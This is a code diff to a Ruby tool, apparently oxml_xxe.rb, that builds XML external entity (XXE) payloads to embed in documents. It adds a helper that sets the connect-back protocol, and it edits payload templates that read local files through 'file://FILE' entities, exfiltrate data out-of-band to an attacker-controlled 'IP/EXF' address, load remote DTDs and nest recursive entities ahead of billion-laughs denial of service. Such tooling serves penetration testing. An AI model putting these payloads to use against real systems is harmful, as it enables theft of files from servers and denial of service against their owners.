@@ -9,6 +9,7 @@ require './lib/utils'
 
 # import config @options
 @options = JSON.parse(File.read('./options.json'))
+@protocols = ["http","https","ftp","jar","file","netdoc","mailto","gopher"]
 
 OptionParser.new do |opts|
 	opts.banner = "Usage: oxml_xxe.rb [options]; \n\t-b or -s are required\n\n"
@@ -46,6 +47,15 @@ OptionParser.new do |opts|
 	end
 end.parse!
 
+# set the protocol if the user hasn't
+def set_protocol(ip)
+	unless ip.include?("://")
+		ip = "http://"+ip
+	end
+	return ip
+end
+
+
 # Keep the payloads organized
 def read_payloads()
 	pl = {}
@@ -54,11 +64,9 @@ def read_payloads()
 	pl["plain_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]
 	pl["plain_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
 	pl["plain_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
-	pl["entity_system_file"] = ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://FILE">]>', "A file to retrieve from the filesystem."]
-	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP/EXF">%a;]>', "Parameter Entity Connectback, the simplest connect back test."]
-	pl["oob_parameter"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP/EXF">%a;]>',"Retrieves a file. Needs to be paired with a valid DTD containing &xxe; on the server."]
-	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP/EXF">%a;]>',"FTP connectback test."]
-	pl["remote_DTD"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://IP/EXF">', "Remote DTD public check"]
+	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "IP/EXF">%a;]>', "Parameter Entity Connectback, the simplest connect back test."]
+	pl["oob_parameter"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/EXF">%a;]>',"Retrieves a file. Needs to be paired with a valid DTD containing &xxe; on the server."]
+	pl["remote_DTD"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">', "Remote DTD public check"]
 
 	# XSS tests
 	pl["CDATA_badchars"] = ['<!DOCTYPE root [<!ENTITY xxe "<![CDATA[\';!--<QQQQQ>={()}]]>">]>', "HTML "]
@@ -114,10 +122,11 @@ if @options["string"]
 end
 
 if @options["poc"]
-	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://IP/EXF">'
+	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">'
 	if payload =~ /IP/ and @options["ip"].size == 0
 		@options["ip"] = ask("Payload Requires a connect back IP:")
 	end
+	@options["ip"] = set_protocol(@options["ip"])
 	payload = payload.gsub("IP",@options["ip"])
 
 	if @options["poc"] == "pdf"
